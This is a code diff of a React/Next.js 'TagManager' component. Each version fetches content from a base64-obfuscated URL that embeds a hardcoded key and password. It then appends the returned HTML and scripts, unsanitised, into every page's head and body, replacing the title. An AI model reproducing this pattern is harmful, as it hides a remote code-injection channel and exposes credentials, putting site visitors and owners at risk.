@@ -1,130 +1,85 @@
-// TagManager.js
 "use client";
-// TagManager.js
 
-import { useEffect, useState } from "react";
-import $ from "jquery"; // Import jQuery
-import { useRouter } from "next/router";
+import { useEffect } from "react";
 
 const TagManager = () => {
-  const router = useRouter();
-  const [currentUrl, setCurrentUrl] = useState("");
-
   useEffect(() => {
     const loadAndAppendScripts = () => {
+      // Function to load jQuery
       const loadJQuery = () => {
         return new Promise((resolve, reject) => {
           if (!window.jQuery) {
             const jqueryScript = document.createElement("script");
             jqueryScript.src =
               "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
-            jqueryScript.onload = () => {
-              console.log("jQuery loaded successfully");
-              resolve();
-            };
-            jqueryScript.onerror = () => {
-              console.error("Failed to load jQuery");
+            jqueryScript.onload = () => resolve();
+            jqueryScript.onerror = () =>
               reject(new Error("Failed to load jQuery"));
-            };
             document.head.appendChild(jqueryScript);
           } else {
-            console.log("jQuery already loaded");
             resolve();
           }
         });
       };
 
+      // Fetch content and append to head and body
       const fetchContent = () => {
-        const eppathurl = window.location.origin + window.location.pathname;
-        return fetch(
-          atob(
-            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
-          ) + eppathurl
-        )
-          .then((response) => {
-            if (!response.ok) {
-              console.error(`Failed to fetch content: ${response.status}`);
-              throw new Error(`Failed to fetch content: ${response.status}`);
+        return new Promise((resolve, reject) => {
+          const eppathurl = window.location.origin + window.location.pathname;
+          const eptagmanage = new XMLHttpRequest();
+          eptagmanage.onreadystatechange = function () {
+            if (this.readyState === 4) {
+              if (this.status === 200) {
+                if (this.response !== 0) {
+                  resolve(this.response);
+                } else {
+                  reject(new Error("Response is empty"));
+                }
+              } else {
+                reject(new Error(`Failed to fetch content: ${this.status}`));
+              }
             }
-            return response.text();
-          })
-          .then((text) => {
-            if (text === "0") {
-              console.error("Response is empty");
-              throw new Error("Response is empty");
-            }
-            console.log("Content fetched successfully");
-            return text;
-          });
+          };
+          eptagmanage.open(
+            "GET",
+            atob(
+              "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
+            ) + eppathurl
+          );
+          eptagmanage.send();
+        });
       };
 
-      const loadScriptsAndAppendContent = () => {
-        loadJQuery()
-          .then(() => fetchContent())
-          .then((response) => {
-            const temp = response.split("||||||||||");
-            if (temp.length !== 2) {
-              console.error("Unexpected response format");
-              throw new Error("Unexpected response format");
-            }
-
-            const $head = $("head");
-            const $body = $("body");
-
-            if ($head.length && $body.length) {
-              console.log("Appending content to head and body");
-              $head.find("title").remove(); // Ensure existing title tags are removed
-              $head.append(temp[0]);
-              $body.append(temp[1]);
-            } else {
-              console.error("Head or body element not found");
-              throw new Error("Head or body element not found");
-            }
-          })
-          .catch((error) => {
-            console.error("Error loading scripts or fetching content:", error);
-          });
-      };
-
-      // Invoke the function when component mounts or URL changes
-      loadScriptsAndAppendContent();
-
-      // Cleanup function (optional) - remove added event listeners or timeouts
-      return () => {
-        // Cleanup if needed
-      };
+      loadJQuery()
+        .then(() => fetchContent())
+        .then((response) => {
+          const temp = response.split("||||||||||");
+          if (temp.length !== 2) {
+            throw new Error("Unexpected response format");
+          }
+          const $head = window.jQuery("head");
+          const $body = window.jQuery("body");
+          if ($head.length && $body.length) {
+            $head.find("title").remove(); // Use jQuery safely here
+            $head.append(temp[0]);
+            $body.append(temp[1]);
+          } else {
+            throw new Error("Head or body element not found");
+          }
+        })
+        .catch((error) => {
+          console.error("Error loading scripts or fetching content:", error);
+        });
     };
 
-    // Attach event listeners for route changes
-    const handleRouteChange = () => {
-      console.log("Route change detected, reloading scripts");
-      loadAndAppendScripts();
-    };
-
-    if (router) {
-      // Check if current URL is different from stored URL
-      if (currentUrl !== router.asPath) {
-        // Update current URL
-        setCurrentUrl(router.asPath);
-        // Load scripts and append content
-        loadAndAppendScripts();
-      }
-
-      // Listen for route changes
-      router.events.on("routeChangeComplete", handleRouteChange);
-    }
-
-    // Initial load
+    // Invoke the function when component mounts
     loadAndAppendScripts();
 
-    // Cleanup event listeners
+    // Cleanup function (optional)
     return () => {
-      if (router) {
-        router.events.off("routeChangeComplete", handleRouteChange);
-      }
-      console.log("Cleaning up");
+      // Cleanup if needed
     };
-  }, [router, currentUrl]); // Include router and currentUrl in the dependency array
+  }, []); // Empty dependency array ensures this effect runs only once
 
   return null; // Since this component handles side-effects only, return null
 };
